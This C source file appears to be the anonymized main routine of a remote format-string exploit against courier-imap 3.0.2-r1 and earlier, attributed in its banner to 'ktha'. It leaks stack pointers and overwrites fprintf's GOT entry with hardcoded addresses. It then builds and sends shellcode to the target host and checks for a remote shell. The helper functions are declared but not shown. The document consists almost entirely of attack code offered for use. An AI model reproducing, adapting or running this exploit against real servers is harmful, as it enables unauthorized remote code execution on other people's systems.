
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 unsigned long VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (int) ;
 int FUNC_1 (char*,int) ;
 int FUNC_2 (int,char*) ;
 char* FUNC_3 (int) ;
 int FUNC_4 (char*,int) ;
 char* FUNC_5 (int*,int,int,int) ;
 int* FUNC_6 (unsigned long,unsigned long,unsigned long) ;
 char* FUNC_7 (char*,char*) ;
 int FUNC_8 (int,int,char*,int) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (int,char*) ;
 int FUNC_12 (int) ;
 int FUNC_13 (int,unsigned long,int,char*,int) ;

FUNC_14 (int VAR_4, char **VAR_5) {
 char *VAR_6="127.0.0.1";
 int VAR_7 = VAR_2;
 int VAR_8;

 char *VAR_9, *VAR_10;
 char *VAR_11;
 int *VAR_12;

 int VAR_13,VAR_14,VAR_15;

 unsigned long VAR_16;
 int VAR_17 = 0;
 unsigned long VAR_18;
 int VAR_19 = 0;
 unsigned long VAR_20;
 int VAR_21 = 0;
 unsigned long VAR_22;
 int VAR_23 = 0;


 unsigned long VAR_24 = 0x0804fefc;

 unsigned long VAR_25 = 0x8057000;

 if (VAR_4 > 1)
  VAR_6 = VAR_5[1];

 FUNC_9("courier-imap <= 3.0.2-r1 Remote Format String Vulnerability exploit by ktha at hush dot com\n");

 FUNC_9("[*] Launching attack against %s:%d\n",VAR_6,VAR_7);

 if (VAR_17 == 0)
  VAR_17 = FUNC_4(VAR_6,VAR_7);
 VAR_16 = VAR_3 - 4 * VAR_17;

 VAR_23 = VAR_0;
 VAR_22 = VAR_16 + 4 * (VAR_23 - 1);

 FUNC_9("[+] Got current ebp(%d): %p\n",VAR_17,VAR_16);

 do{
  VAR_19 = FUNC_8(VAR_19,VAR_17,VAR_6,VAR_7);
  if (VAR_19 == -1)
  FUNC_2(1,"[-] Failed to get a saved_ebp !");

  VAR_18 = VAR_16 + 4 * (VAR_19 - 1);
  FUNC_9("[+] Got possible saved ebp(%d): %p\n",VAR_19,VAR_18);

  VAR_20 = VAR_1 + VAR_18;
  VAR_21 = (VAR_20 - VAR_16) / 4 + 1;
 FUNC_9("[+] Got possible write on the stack pointer(%d): %p\n",VAR_21,VAR_20);

  FUNC_9("[+] Verifying...");
  VAR_14 = FUNC_13(VAR_21,VAR_22,VAR_19,VAR_6,VAR_7);
  if (VAR_14)
  FUNC_9("OK\n");
  else {
  FUNC_9("failed\n");
  VAR_19++;
  }
 }while (!VAR_14);

 FUNC_9("[+] Building fmt...");
 VAR_12 = FUNC_6(VAR_22,VAR_24,VAR_25);
 VAR_9 = FUNC_5(VAR_12,VAR_19,VAR_21,VAR_23);
 FUNC_9("done\n");

 FUNC_9("[+] Building shellcode...");
 VAR_10 = FUNC_3(800);
 FUNC_9("done\n");

 FUNC_9("[*] Using ret: %p\n",VAR_25);
 FUNC_9("[*] Using got of fprintf(): %p\n",VAR_24);

 VAR_11 = FUNC_7(VAR_9,VAR_10);

 VAR_8 = FUNC_1(VAR_6, VAR_7);
 FUNC_11(VAR_8,VAR_11);
 FUNC_12(2);
 FUNC_0 (VAR_8);

 FUNC_9("[*] Checking for shell..\n");
 FUNC_10(VAR_6);
}
